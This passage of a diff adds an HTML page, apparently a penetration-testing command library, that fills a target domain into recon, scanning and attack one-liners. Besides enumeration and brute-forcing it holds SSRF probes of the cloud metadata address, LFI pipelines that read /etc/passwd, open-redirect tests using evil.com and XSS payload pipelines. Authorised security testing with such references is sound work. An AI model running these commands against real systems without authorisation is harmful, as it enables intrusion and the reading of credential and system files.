@@ -1,0 +1,901 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CyberWolf Scanner Command Library</title>
+<link rel="icon" href="./images/favicon.ico" type="image/x-icon">
+<style>
+    @font-face {
+        font-family: 'VT323';
+        src: url('./vt323.regular.ttf') format('truetype');
+        font-display: swap;
+    }
+    :root {
+        color-scheme: light dark;
+        --bg: #14120B;
+        --panel: rgba(27, 25, 19, 0.9);
+        --text: #e2e8f0;
+        --accent: #38bdf8;
+        --muted: #94a3b8;
+        --border: rgba(148, 163, 184, 0.2);
+        --shadow: rgba(15, 23, 42, 0.35);
+    }
+    * {
+        box-sizing: border-box;
+    }
+    body {
+        margin: 0;
+        font-family: 'VT323', "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        background: radial-gradient(circle at top, rgba(56, 189, 248, 0.15), transparent 55%), var(--bg);
+        color: var(--text);
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        cursor: url('./mouse.cur'), auto;
+    }
+    header {
+        padding: 2.5rem 1.5rem 1rem;
+        position: relative;
+        z-index: 10;
+        backdrop-filter: blur(18px);
+        background: linear-gradient(180deg, rgba(15, 23, 42, 0.85), rgba(15, 23, 42, 0.45), transparent);
+    }
+    .header-inner {
+        max-width: 1100px;
+        margin: 0 auto;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 1.5rem;
+        text-align: center;
+    }
+    .header-logo {
+        width: clamp(70px, 10vw, 110px);
+        height: clamp(70px, 10vw, 110px);
+        border-radius: 50%;
+        overflow: hidden;
+        border: 3px solid rgba(56, 189, 248, 0.4);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background: #ffffff;
+    }
+    .header-logo img {
+        width: 80%;
+        height: 80%;
+        object-fit: contain;
+        display: block;
+    }
+    .back-link {
+        align-self: flex-start;
+        margin-bottom: 1rem;
+        font-size: 1.1rem;
+        letter-spacing: 0.05em;
+        color: var(--text);
+        text-decoration: none;
+        display: inline-flex;
+        align-items: center;
+        gap: 0.5rem;
+        border: 1px solid rgba(148, 163, 184, 0.45);
+        padding: 0.45rem 0.9rem;
+        cursor: url('./mouse.cur'), pointer;
+        background: rgba(27, 27, 27, 0.45);
+        transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
+    .back-link:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 10px 24px -14px rgba(148, 163, 184, 0.4);
+    }
+    header h1 {
+        margin: 0;
+        font-size: 2.2rem;
+        letter-spacing: 0.05em;
+    }
+    header p {
+        margin: 0.5rem auto 0;
+        max-width: 680px;
+        line-height: 1.5;
+        color: var(--muted);
+    }
+    .controls {
+        margin: 2rem auto 0;
+        max-width: 960px;
+        width: calc(100% - 2rem);
+        display: flex;
+        flex-wrap: wrap;
+        gap: 1rem;
+        justify-content: center;
+        padding: 0;
+        background: transparent;
+        border-radius: 0;
+        box-shadow: none;
+    }
+    .field {
+        display: flex;
+        flex-direction: column;
+        gap: 0.3rem;
+        flex: 1 1 240px;
+        min-width: 200px;
+    }
+    label {
+        font-weight: 600;
+        font-size: 1.15rem;
+        letter-spacing: 0.04em;
+    }
+    input {
+        padding: 0.75rem 1rem;
+        border-radius: 12px;
+        border: 1px solid var(--border);
+        background: rgba(15, 23, 42, 0.6);
+        color: var(--text);
+        font-size: 1.1rem;
+        transition: border 0.2s ease, box-shadow 0.2s ease;
+    }
+    input:focus {
+        outline: none;
+        border-color: var(--accent);
+        box-shadow: 0 0 0 3px rgba(56, 189, 248, 0.2);
+    }
+    main {
+        flex: 1;
+        padding: 1rem 1rem 2rem;
+    }
+    .category {
+        margin: 1.5rem auto;
+        max-width: 1100px;
+    }
+    .category h2 {
+        margin: 0 0 1rem;
+        font-size: 1.8rem;
+        letter-spacing: 0.05em;
+        text-transform: uppercase;
+        color: #ef4444;
+    }
+    .tool-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+        gap: 1rem;
+    }
+    #command-sections {
+        scroll-margin-top: 120px;
+    }
+    .tool {
+        background: var(--panel);
+        padding: 1rem;
+        border-radius: 0;
+        display: flex;
+        flex-direction: column;
+        gap: 0.75rem;
+        position: relative;
+        box-shadow: 0 12px 25px -15px var(--shadow), inset 0 0 0 1px var(--border);
+    }
+    .tool-header h3 {
+        margin: 0;
+        font-size: 1.35rem;
+        letter-spacing: 0.04em;
+    }
+    .tool-header p {
+        margin: 0.2rem 0 0;
+        color: var(--muted);
+        font-size: 1.05rem;
+        line-height: 1.4;
+    }
+    .command-output {
+        width: 100%;
+        min-height: 90px;
+        resize: vertical;
+        padding: 0.75rem 1rem;
+        border-radius: 0;
+        border: 1px solid var(--border);
+        background: rgba(15, 23, 42, 0.45);
+        color: var(--text);
+        font-family: 'VT323', "Fira Code", "Consolas", "Courier New", monospace;
+        font-size: 1rem;
+        line-height: 1.5;
+    }
+    .command-output:focus {
+        outline: none;
+        border-color: var(--accent);
+        box-shadow: 0 0 0 3px rgba(56, 189, 248, 0.2);
+    }
+    .copy-btn {
+        align-self: flex-end;
+        padding: 0.55rem 0.85rem;
+        border-radius: 0;
+        border: 1px solid rgba(148, 163, 184, 0.45);
+        background: #ffffff;
+        color: #111827;
+        font-weight: 600;
+        cursor: url('./mouse.cur'), pointer;
+        transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
+    .copy-btn:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 10px 22px -12px rgba(148, 163, 184, 0.5);
+    }
+    .copy-btn:active {
+        transform: scale(0.98);
+    }
+    footer {
+        text-align: center;
+        padding: 1.5rem;
+        color: var(--muted);
+        font-size: 0.85rem;
+    }
+    .scroll-controls {
+        position: fixed;
+        right: 1.5rem;
+        bottom: 1.5rem;
+        display: flex;
+        flex-direction: column;
+        gap: 0.75rem;
+        z-index: 20;
+    }
+    .scroll-btn {
+        width: 3rem;
+        height: 3rem;
+        border-radius: 50%;
+        border: 1px solid rgba(56, 189, 248, 0.45);
+        background: linear-gradient(135deg, rgba(56, 189, 248, 0.18), rgba(56, 189, 248, 0.05));
+        color: var(--accent);
+        font-size: 1.5rem;
+        cursor: url('./mouse.cur'), pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
+    .scroll-btn:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 12px 24px -16px rgba(56, 189, 248, 0.5);
+    }
+    .scroll-btn:active {
+        transform: scale(0.95);
+    }
+    @media (max-width: 768px) {
+        header {
+            padding: 2rem 1rem 1rem;
+        }
+        header h1 {
+            font-size: 1.8rem;
+        }
+        .controls {
+            padding: 1.1rem;
+        }
+        .tool-grid {
+            grid-template-columns: 1fr;
+        }
+    }
+</style>
+</head>
+<body>
+<header>
+    <div class="header-inner">
+        <a class="back-link" href="index.html">← Back to Tool Deck</a>
+        <div class="header-logo">
+            <img src="./images/favicon.ico" alt="CyberWolf logo">
+        </div>
+        <h1>CyberWolf Scanner Command Library</h1>
+        <p>Interactive, responsive command reference for offensive security workflows. Update the target domain or URL to customize the entire library to your engagement instantly.</p>
+        <form class="controls" id="target-form">
+        <div class="field">
+            <label for="domain">Target Domain</label>
+            <input id="domain" name="domain" type="text" placeholder="example.com" autocomplete="off" value="example.com">
+        </div>
+        <div class="field">
+            <label for="url">Target URL</label>
+            <input id="url" name="url" type="text" placeholder="https://example.com" autocomplete="off" value="https://example.com">
+        </div>
+    </form>
+    </div>
+</header>
+<main>
+    <div id="command-sections"></div>
+</main>
+<div class="scroll-controls">
+    <button class="scroll-btn" type="button" id="scroll-up" aria-label="Scroll to top">↑</button>
+    <button class="scroll-btn" type="button" id="scroll-down" aria-label="Scroll to bottom">↓</button>
+</div>
+<footer>CyberWolf Scanner &mdash; Adaptive Reconnaissance Toolkit</footer>
+<script>
+const SECTIONS = [
+    {
+        category: "Automated Enumeration",
+        entries: [
+            {
+                title: "Subfinder",
+                description: "Fast subdomain discovery using multiple data sources",
+                command: "subfinder -d {{domain}} -all -recursive -o subfinder.txt"
+            },
+            {
+                title: "Assetfinder",
+                description: "Find domains and subdomains associated with a given domain",
+                command: "assetfinder --subs-only {{domain}} > assetfinder.txt"
+            },
+            {
+                title: "Sublist3r",
+                description: "Subdomain enumeration using OSINT techniques",
+                command: "sublist3r -d {{domain}} -e baidu,yahoo,google,bing,ask,netcraft,virustotal,threatcrowd,crtsh,passivedns -v -o sublist3r.txt"
+            },
+            {
+                title: "Amass Passive",
+                description: "In-depth attack surface mapping and external asset discovery",
+                command: "amass enum -passive -d {{domain}} | cut -d']' -f 2 | awk '{print $1}' | sort -u > amass.txt"
+            }
+        ]
+    },
+    {
+        category: "Public Sources",
+        entries: [
+            {
+                title: "Certificate Transparency",
+                description: "Find subdomains from SSL certificate transparency logs",
+                command: "curl -s \"https://crt.sh?q={{domain}}&output=json\" | jq -r '.[].name_value' | grep -Po '(\\\\w+\\\\.\\\\w+\\\\.\\\\w+)$' > crtsh.txt"
+            },
+            {
+                title: "Wayback Machine",
+                description: "Historical subdomain discovery from web archives",
+                command: "curl -s \"http://web.archive.org/cdx/search/cdx?url=*.{{domain}}/*&output=text&fl=original&collapse=urlkey\" | sort | sed -e 's_https*://__' -e \"s/\\/.*//\" -e 's/:.*//' -e 's/^www\\\\.//' | sort -u > wayback.txt"
+            }
+        ]
+    },
+    {
+        category: "Subdomain Processing",
+        entries: [
+            {
+                title: "Merge & Deduplicate",
+                description: "Combine and remove duplicate subdomains",
+                command: "cat *.txt | sort -u > final.txt"
+            },
+            {
+                title: "FFUF Subdomain Bruteforce",
+                description: "Brute force subdomain discovery using wordlists",
+                command: "ffuf -u \"https://FUZZ.{{domain}}\" -w wordlist.txt -mc 200,301,302"
+            },
+            {
+                title: "Subdomain Permutation",
+                description: "Generate subdomain permutations and resolve them",
+                command: "subfinder -d {{domain}} | alterx | dnsx"
+            },
+            {
+                title: "Alterx Enrichment",
+                description: "Enrich domain with common patterns",
+                command: "echo {{domain}} | alterx -enrich | dnsx"
+            },
+            {
+                title: "Alterx with Wordlist",
+                description: "Use wordlist for subdomain permutation",
+                command: "echo {{domain}} | alterx -pp word=/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt | dnsx"
+            }
+        ]
+    },
+    {
+        category: "ASN & IP Discovery",
+        entries: [
+            {
+                title: "ASN Discovery",
+                description: "Discover IP addresses associated with domain's ASN",
+                command: "asnmap -d {{domain}} | dnsx -silent -resp-only"
+            },
+            {
+                title: "Amass Intel (Organization)",
+                description: "Discover assets by organization name",
+                command: "amass intel -org \"organization_name\""
+            },
+            {
+                title: "Amass Intel (CIDR)",
+                description: "Discover assets within IP range",
+                command: "amass intel -active -cidr 159.69.129.82/32"
+            },
+            {
+                title: "Amass Intel (ASN)",
+                description: "Discover assets by ASN number",
+                command: "amass intel -active -asn [asn_number]"
+            }
+        ]
+    },
+    {
+        category: "IP Harvesting",
+        entries: [
+            {
+                title: "VirusTotal IP Lookup",
+                description: "Extract IP addresses from VirusTotal",
+                command: "curl -s \"https://www.virustotal.com/vtapi/v2/domain/report?domain={{domain}}&apikey=[api-key]\" | jq -r '.. | .ip_address? // empty' | grep -Eo '([0-9]{1,3}\\\\.){3}[0-9]{1,3}'"
+            },
+            {
+                title: "AlienVault OTX",
+                description: "Get IP addresses from AlienVault OTX",
+                command: "curl -s \"https://otx.alienvault.com/api/v1/indicators/hostname/{{domain}}/url_list?limit=500&page=1\" | jq -r '.url_list[]?.result?.urlworker?.ip // empty' | grep -Eo '([0-9]{1,3}\\\\.){3}[0-9]{1,3}'"
+            },
+            {
+                title: "URLScan.io",
+                description: "Extract IP addresses from URLScan.io",
+                command: "curl -s \"https://urlscan.io/api/v1/search/?q=domain:{{domain}}&size=10000\" | jq -r '.results[]?.page?.ip // empty' | grep -Eo '([0-9]{1,3}\\\\.){3}[0-9]{1,3}'"
+            },
+            {
+                title: "Shodan SSL Search",
+                description: "Find IP addresses using Shodan SSL certificate search",
+                command: "shodan search Ssl.cert.subject.CN:\"{{domain}}\" 200 --fields ip_str | httpx -sc -title -server -td"
+            }
+        ]
+    },
+    {
+        category: "Live Host Discovery",
+        entries: [
+            {
+                title: "HTTPX Basic",
+                description: "Probe for live hosts on multiple ports",
+                command: "cat subdomain.txt | httpx -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt"
+            },
+            {
+                title: "HTTPX with Status Codes",
+                description: "Probe with detailed information extraction",
+                command: "cat subdomain.txt | httpx -sc -title -server -td -ports 80,443,8080,8000,8888 -threads 200"
+            }
+        ]
+    },
+    {
+        category: "Visual Recon",
+        entries: [
+            {
+                title: "Aquatone Basic",
+                description: "Take screenshots of live hosts",
+                command: "cat hosts.txt | aquatone"
+            },
+            {
+                title: "Aquatone Custom Ports",
+                description: "Screenshot with custom port list",
+                command: "cat hosts.txt | aquatone -ports 80,443,8000,8080,8443"
+            },
+            {
+                title: "Aquatone Extended Ports",
+                description: "Screenshot with extended port range",
+                command: "cat hosts.txt | aquatone -ports 80,81,443,591,2082,2087,2095,2096,3000,8000,8001,8008,8080,8083,8443,8834,8888"
+            }
+        ]
+    },
+    {
+        category: "URL Collection & Analysis",
+        entries: [
+            {
+                title: "Katana",
+                description: "Fast web crawler for URL discovery",
+                command: "katana -u livesubdomains.txt -d 2 -o urls.txt"
+            },
+            {
+                title: "Hakrawler",
+                description: "Simple, fast web crawler",
+                command: "cat urls.txt | hakrawler -u > urls3.txt"
+            },
+            {
+                title: "GAU",
+                description: "Fetch known URLs from OSINT sources",
+                command: "cat livesubdomains.txt | gau | sort -u > urls2.txt"
+            },
+            {
+                title: "URLFinder",
+                description: "Find URLs from various sources",
+                command: "urlfinder -d {{domain}} | sort -u > urls3.txt"
+            },
+            {
+                title: "GAU with Status Filter",
+                description: "Get URLs with 200 status code and deduplicate",
+                command: "echo {{domain}} | gau --mc 200 | urldedupe > urls.txt"
+            }
+        ]
+    },
+    {
+        category: "Parameter Extraction",
+        entries: [
+            {
+                title: "Extract URLs with Parameters",
+                description: "Extract URLs containing parameters",
+                command: "cat allurls.txt | grep '=' | urldedupe | tee output.txt"
+            },
+            {
+                title: "Parameter Pattern Matching",
+                description: "Extract URLs with parameter patterns",
+                command: "cat allurls.txt | grep -E '\\?[^=]+=.+$' | tee output.txt"
+            },
+            {
+                title: "GF SQLi Pattern",
+                description: "Filter URLs potentially vulnerable to SQL injection",
+                command: "cat allurls.txt | gf sqli"
+            }
+        ]
+    },
+    {
+        category: "Vulnerability Scanning",
+        entries: [
+            {
+                title: "Nuclei Single Target",
+                description: "Run Nuclei templates against single target",
+                command: "nuclei -u {{url}} -bs 50 -c 30"
+            },
+            {
+                title: "Nuclei Multiple Targets",
+                description: "Run Nuclei templates against multiple targets",
+                command: "nuclei -l live_domains.txt -bs 50 -c 30"
+            },
+            {
+                title: "Nuclei with Specific Severity",
+                description: "Run only critical and high severity templates",
+                command: "nuclei -l live_domains.txt -s critical,high -bs 50 -c 30"
+            }
+        ]
+    },
+    {
+        category: "Sensitive File Discovery",
+        entries: [
+            {
+                title: "Basic Sensitive Files",
+                description: "Filter URLs for common sensitive file extensions",
+                command: "cat allurls.txt | grep -E \"\\.xls|\\.xml|\\.xlsx|\\.json|\\.pdf|\\.sql|\\.doc|\\.docx|\\.pptx|\\.txt|\\.zip|\\.tar\\.gz|\\.tgz|\\.bak|\\.7z|\\.rar|\\.log|\\.cache|\\.secret|\\.db|\\.backup|\\.yml|\\.gz|\\.config|\\.csv|\\.yaml|\\.md|\\.md5\""
+            },
+            {
+                title: "Extended Sensitive Files",
+                description: "Extended regex for sensitive file discovery",
+                command: "cat allurls.txt | grep -E \"\\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|tar|xz|7zip|p12|pem|key|crt|csr|sh|pl|py|java|class|jar|war|ear|sqlitedb|sqlite3|dbf|db3|accdb|mdb|sqlcipher|gitignore|env|ini|conf|properties|plist|cfg)$\""
+            },
+            {
+                title: "Google Dork for Files",
+                description: "Google search for sensitive files",
+                command: "site:*.{{domain}} (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)"
+            }
+        ]
+    },
+    {
+        category: "Hidden Parameter Discovery",
+        entries: [
+            {
+                title: "Arjun Passive Discovery",
+                description: "Passive parameter discovery using Arjun",
+                command: "arjun -u {{url}} -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers \"User-Agent: Mozilla/5.0\""
+            },
+            {
+                title: "Arjun Active Discovery",
+                description: "Active parameter discovery with wordlist",
+                command: "arjun -u {{url}} -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers \"User-Agent: Mozilla/5.0\""
+            }
+        ]
+    },
+    {
+        category: "Directory & File Bruteforcing",
+        entries: [
+            {
+                title: "Dirsearch Basic",
+                description: "Basic directory and file discovery",
+                command: "dirsearch -u {{url}} --full-url --deep-recursive -r"
+            },
+            {
+                title: "Dirsearch Extended",
+                description: "Extended directory bruteforcing with multiple extensions",
+                command: "dirsearch -u {{url}} -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1"
+            },
+            {
+                title: "FFUF Directory Discovery",
+                description: "FFUF directory discovery with recursion and multiple extensions",
+                command: "ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u {{url}}/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0\" -t 10"
+            }
+        ]
+    },
+    {
+        category: "WordPress Security Testing",
+        entries: [
+            {
+                title: "WPScan Full Enumeration",
+                description: "Comprehensive WordPress security scan with aggressive plugin detection",
+                command: "wpscan --url {{url}} --disable-tls-checks --api-token YOUR_API_TOKEN -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force"
+            }
+        ]
+    },
+    {
+        category: "CORS Testing",
+        entries: [
+            {
+                title: "CORS Test with Curl",
+                description: "Test CORS configuration with custom origin",
+                command: "curl -H \"Origin: http://{{domain}}\" -I {{url}}/wp-json/"
+            },
+            {
+                title: "Detailed CORS Analysis",
+                description: "Analyze CORS headers in response",
+                command: "curl -H \"Origin: http://{{domain}}\" -I {{url}}/wp-json/ | grep -i -e \"access-control-allow-origin\" -e \"access-control-allow-methods\" -e \"access-control-allow-credentials\""
+            },
+            {
+                title: "Automated CORS Testing",
+                description: "Automated CORS vulnerability scanning with Nuclei",
+                command: "cat subdomains.txt | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/cors/ -o cors_results.txt"
+            }
+        ]
+    },
+    {
+        category: "Subdomain Takeover",
+        entries: [
+            {
+                title: "Subzy",
+                description: "Automated subdomain takeover detection with SSL verification",
+                command: "subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl"
+            }
+        ]
+    },
+    {
+        category: "Git Repository Disclosure",
+        entries: [
+            {
+                title: "Git Directory Discovery",
+                description: "Detect exposed .git directories and directory listings",
+                command: "cat domains.txt | grep \"SUCCESS\" | gf urls | httpx -sc -server -cl -path \"/.git/\" -mc 200 -location -ms \"Index of\" -probe"
+            }
+        ]
+    },
+    {
+        category: "SSRF Testing",
+        entries: [
+            {
+                title: "Find SSRF Parameters",
+                description: "Identify URLs with SSRF-prone parameters",
+                command: "cat urls.txt | grep -E 'url=|uri=|redirect=|next=|data=|path=|dest=|proxy=|file=|img=|out=|continue=' | sort -u"
+            },
+            {
+                title: "Find API/Webhook Patterns",
+                description: "Find API endpoints and webhook integrations",
+                command: "cat urls.txt | grep -i 'webhook\\|callback\\|upload\\|fetch\\|import\\|api' | sort -u"
+            },
+            {
+                title: "Nuclei SSRF Scan",
+                description: "Automated SSRF vulnerability scanning",
+                command: "cat urls.txt | nuclei -t nuclei-templates/vulnerabilities/ssrf/"
+            },
+            {
+                title: "Basic SSRF Test",
+                description: "Basic SSRF test to localhost",
+                command: "curl \"{{url}}?url=http://127.0.0.1:80/\""
+            },
+            {
+                title: "Cloud Metadata SSRF",
+                description: "Test SSRF against cloud metadata services",
+                command: "curl \"{{url}}?endpoint=http://169.254.169.254/latest/meta-data/\""
+            }
+        ]
+    },
+    {
+        category: "Open Redirect Testing",
+        entries: [
+            {
+                title: "Find Redirect Parameters",
+                description: "Extract URLs with redirect parameters",
+                command: "cat urls.txt | grep -Pi \"returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login\\?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|Url=|desturl=|u=|Redirect=|location=|ReturnUrl=\" | tee redirect_params.txt"
+            },
+            {
+                title: "GF Redirect Pattern",
+                description: "Use GF patterns to find redirect parameters",
+                command: "cat urls.txt | gf redirect | uro | sort -u | tee redirect_params.txt"
+            },
+            {
+                title: "Basic Open Redirect Test",
+                description: "Test redirect parameters with evil target",
+                command: "cat redirect_params.txt | qsreplace \"https://evil.com\" | httpx -silent -fr -mr \"evil.com\""
+            },
+            {
+                title: "Comprehensive Redirect Test",
+                description: "Full pipeline for open redirect testing",
+                command: "subfinder -d {{domain}} -all | httpx -silent | gau | gf redirect | uro | qsreplace \"https://evil.com\" | httpx -silent -fr -mr \"evil.com\""
+            },
+            {
+                title: "Comprehensive Redirect Test 2",
+                description: "Extended pipeline for open redirect testing",
+                command: "subfinder -d \"{{domain}}\" -all -recursive | httpx -mc 200 -silent | sed -E 's,https?://(www\\\\.)?,,' | anew | urlfinder -all | iconv -f ISO-8859-1 -t UTF-8 -c | grep -aE '\\?.*=.*(&.*)?' | match -r \"OREDIR\" -m '/home/haxshadow/match/redirect.txt' -d -o ready_urls.txt; or -f ready_urls.txt -pl \"OREDIR\" -p '/home/haxshadow/payload/Open-Redirect/or.txt' -o Open_redirect_found.txt"
+            }
+        ]
+    },
+    {
+        category: "LFI Testing",
+        entries: [
+            {
+                title: "FFUF LFI Test",
+                description: "LFI testing with FFUF and passwd file detection",
+                command: "echo \"https://{{domain}}/\" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace \"FUZZ\" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr \"root:(x|\\*|\\$[^\\:]*):0:0:\" -v"
+            },
+            {
+                title: "Curl LFI Test",
+                description: "LFI testing with curl and parallel processing",
+                command: "gau {{domain}} | gf lfi | qsreplace \"/etc/passwd\" | xargs -I% -P 25 sh -c 'curl -s \"%\" 2>&1 | grep -q \"root:x\" && echo \"VULN! %\"'"
+            },
+            {
+                title: "HTTPx LFI Test",
+                description: "LFI testing with httpx",
+                command: "echo '{{url}}/index.php?page=' | httpx -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr \"root:(x|\\*|\\$[^\\:]*):0:0:\""
+            }
+        ]
+    },
+    {
+        category: "XSS Testing",
+        entries: [
+            {
+                title: "Comprehensive Reflected XSS",
+                description: "Comprehensive reflected XSS testing with multiple payloads",
+                command: "subfinder -d \"{{domain}}\" -all -recursive | httpx -mc 200 -silent | sed -E 's,https?://(www\\\\.)?,,' | anew | urlfinder -all | iconv -f ISO-8859-1 -t UTF-8 -c | grep -aE '\\?.*=.*(&.*)?' | grep -aiEv '\\\\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|jpeg|js|json|pdf|gif|xml|webp)($|\\\\s|\\\\?|&|#|/|\\\\.)' | awk -F'[?&=]' '!seen[$1$2]++' | anew | rc -p \"RXSS\" -o rxss.txt; cxss -f rxss.txt -p \"RXSS\" -i \"FUZZ\" -s | grep -E \"Unfiltered\\(([2-9]|1[0-4])\\):\" | sed 's/URL:[[:space:]]*//g' | sed 's/ Param:.*$//' | anew > xss_unfilter.txt; xsser -f xss_unfilter.txt -p /home/haxshadow/Xss-payload/xss-hax.txt -pl \"FUZZ\" -o Rxss_found.txt"
+            },
+            {
+                title: "Blind XSS Oneliners",
+                description: "Blind XSS testing with specialized payloads",
+                command: "subfinder -d \"{{domain}}\" -all -recursive | httpx -mc 200 -silent | sed -E 's,https?://(www\\\\.)?,,' | anew | urlfinder -all | iconv -f ISO-8859-1 -t UTF-8 -c | grep -aE '\\?.*=.*(&.*)?' | grep -aiEv '\\\\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|jpeg|js|json|pdf|gif|xml|webp)($|\\\\s|\\\\?|&|#|/|\\\\.)' | awk -F'[?&=]' '!seen[$1$2]++' | anew > bxss.txt; xsser -f bxss.txt -p /home/haxshadow/Xss-payload/blindXss.txt"
+            },
+            {
+                title: "RXSS & BXSS Combined",
+                description: "Comprehensive RXSS and BXSS detection pipeline",
+                command: "sudo mkdir -p --mode=777 all_xss/{{domain}}/RXSS_BXSS; urlfinder -d \"{{domain}}\" -all | iconv -f ISO-8859-1 -t UTF-8 -c | grep -aiEv '\\\\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|jpeg|js|json|pdf|gif|xml|webp)($|\\\\s|\\\\?|&|#|/|\\\\.)' | anew > all_xss/{{domain}}/RXSS_BXSS/all_urls.txt; cat all_xss/{{domain}}/RXSS_BXSS/all_urls.txt | grep -aE '\\?.*=.*(&.*)?' | awk -F'[?&=]' '!seen[$1$2]++' | pvreplace -silent -fuzzing-type postfix | anew | tee all_xss/{{domain}}/RXSS_BXSS/blind_xss_parameters.txt; cat all_xss/{{domain}}/RXSS_BXSS/all_urls.txt | grep -aiE \"contact|support|chatbot|ticket|comment|feedback|forms|surveys|forums|help|login|registration|register|signin|signup\" | httpx -mc 200,302 -timeout 5 -duc -nc | anew | tee all_xss/{{domain}}/RXSS_BXSS/blind_xss_pages.txt; cat all_xss/{{domain}}/RXSS_BXSS/blind_xss_parameters.txt | grep -a \"FUZZ\" | sed 's/FUZZ//g' | httpx -mc 200 -timeout 5 -duc -nc | rc -p \"RXSS\" -o all_xss/{{domain}}/RXSS_BXSS/reflected_xss_parameters.txt; cat all_xss/{{domain}}/RXSS_BXSS/reflected_xss_parameters.txt | cxss -p \"RXSS\" -i \"FUZZ\" | grep -E \"Unfiltered\\(([1-9]|1[0-4])\\): \\[[\\\"'<>$|()\\`:;{} ]{2,}\\]\" | sed 's/URL:[[:space:]]*//g' | sed 's/ Param:.*$//' | anew | tee all_xss/{{domain}}/RXSS_BXSS/reflected_unfilter_xss_parameters.txt"
+            }
+        ]
+    },
+    {
+        category: "Additional Tools",
+        entries: [
+            {
+                title: "HTML Content Filtering",
+                description: "Filter HTML content from discovered URLs",
+                command: "echo {{domain}} | gau | grep -Eo '(\\/[^\\/]+)\\.(php|asp|aspx|jsp|jsf|cfm|pl|perl|cgi|htm|html)$' | httpx -status-code -mc 200 -content-type | grep -E 'text/html|application/xhtml+xml'"
+            },
+            {
+                title: "JavaScript Content Filtering",
+                description: "Filter JavaScript files from discovered URLs",
+                command: "echo {{domain}} | gau | grep '\\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'"
+            }
+        ]
+    },
+    {
+        category: "Miscellaneous",
+        entries: [
+            {
+                title: "Extract IP Addresses",
+                description: "Extract IP addresses from text files",
+                command: "grep -oE \"\\b([0-9]{1,3}\\\\.){3}[0-9]{1,3}\\b\" file.txt"
+            },
+            {
+                title: "Process Amass Output",
+                description: "Process Amass output to extract clean domains",
+                command: "cat domains.txt | cut -d']' -f2 | awk '{print $2}' | tr ',' '\\n' | sort -u > amass.txt"
+            },
+            {
+                title: "Filter Dynamic Files",
+                description: "Filter URLs for dynamic files with parameters",
+                command: "cat urls.txt | grep -E \".php|.asp|.aspx|.jspx|.jsp\" | grep '=' | sort > output.txt"
+            },
+            {
+                title: "Clean Parameters",
+                description: "Clean parameter values from URLs",
+                command: "cat output.txt | sed 's/=.*/=/' > final.txt"
+            },
+            {
+                title: "URO Deduplication",
+                description: "Remove duplicate URLs using URO",
+                command: "cat urls.txt | uro | sort -u > deduplicated_urls.txt"
+            },
+            {
+                title: "QSReplace Parameter Testing",
+                description: "Replace parameter values with FUZZ for testing",
+                command: "cat urls.txt | qsreplace \"FUZZ\" | sort -u > fuzz_urls.txt"
+            }
+        ]
+    },
+    {
+        category: "Tool Installation Guide",
+        entries: [
+            {
+                title: "Install Open Redirect Tester",
+                description: "Open redirect vulnerability testing tool",
+                command: "go install -v github.com/h6nt3r/or@latest"
+            },
+            {
+                title: "Install Match",
+                description: "Pattern matching and URL filtering tool",
+                command: "cd /opt/ && sudo git clone https://github.com/h6nt3r/matcher.git\ncd\nsudo chmod +x /opt/matcher/match.py\nsudo ln -sf /opt/matcher/match.py /usr/local/bin/match\nmatch -h"
+            },
+            {
+                title: "Install RC",
+                description: "Reflected XSS testing tool",
+                command: "go install -v github.com/h6nt3r/rc@latest"
+            },
+            {
+                title: "Install CXSS",
+                description: "Contextual XSS vulnerability scanner",
+                command: "go install github.com/haxshadow/cxss@latest"
